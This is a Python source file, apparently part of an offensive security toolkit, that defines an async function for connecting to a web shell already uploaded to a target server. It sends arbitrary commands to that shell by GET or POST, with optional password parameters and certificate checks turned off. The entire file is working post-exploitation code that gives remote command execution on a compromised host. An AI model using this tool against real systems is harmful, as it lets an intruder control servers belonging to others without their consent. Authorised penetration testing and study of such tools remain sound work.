"""
Web Shell Connector — connect to an uploaded web shell and execute commands.
"""

from typing import Any

import httpx


async def webshell_connect(
    shell_url: str,
    command: str = "",
    method: str = "get",
    param_name: str = "cmd",
    password: str = "",
    auth_param: str = "auth",
    extra_params: str = "",
    timeout: int = 15,
) -> dict:
    """Connect to an uploaded web shell and execute commands.

    Args:
        shell_url:    URL of the uploaded web shell.
        command:      Command to execute (empty = test connection only).
        method:       HTTP method — ``"get"`` or ``"post"`` (default ``"get"``).
        param_name:   Parameter name for command (default ``"cmd"``).
        password:     Password if shell is protected (default ``""``).
        auth_param:   Parameter name for auth password (default ``"auth"``).
        extra_params: Extra parameters as ``"key1=val1&key2=val2"``.
        timeout:      Request timeout in seconds (default 15).

    Returns:
        A dict with executed, output, response_code, shell_alive, error.
    """
    result: dict[str, Any] = {
        "executed": False,
        "output": "",
        "response_code": 0,
        "shell_alive": False,
        "error": None,
    }

    if not shell_url:
        result["error"] = "shell_url is required."
        return result

    method = method.lower()
    if method not in ("get", "post"):
        result["error"] = f"Unsupported method: '{method}'. Use 'get' or 'post'."
        return result

    # Build params
    params: dict[str, str] = {}
    if password:
        params[auth_param] = password
    if command:
        params[param_name] = command
    if extra_params:
        for pair in extra_params.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params[k.strip()] = v.strip()

    # If no command, do a basic connectivity test
    if not command:
        params[param_name] = "echo webshell_alive_check"

    try:
        async with httpx.AsyncClient(timeout=float(timeout), verify=False, follow_redirects=True) as client:
            if method == "get":
                resp = await client.get(shell_url, params=params)
            else:
                resp = await client.post(shell_url, data=params)

            result["response_code"] = resp.status_code
            output = resp.text.strip()

            if resp.status_code == 200:
                result["shell_alive"] = True
                result["output"] = output
                if command:
                    result["executed"] = True
            elif resp.status_code == 404:
                result["error"] = "Shell not found (404). Check the URL."
            elif resp.status_code == 403:
                result["error"] = "Access denied (403). Password may be required."
            else:
                result["error"] = f"Unexpected status: {resp.status_code}"
                result["output"] = output

    except httpx.TimeoutException:
        result["error"] = f"Request timed out after {timeout}s."
    except httpx.ConnectError:
        result["error"] = "Connection failed. Check if the shell URL is reachable."
    except Exception as exc:
        result["error"] = str(exc)

    return result
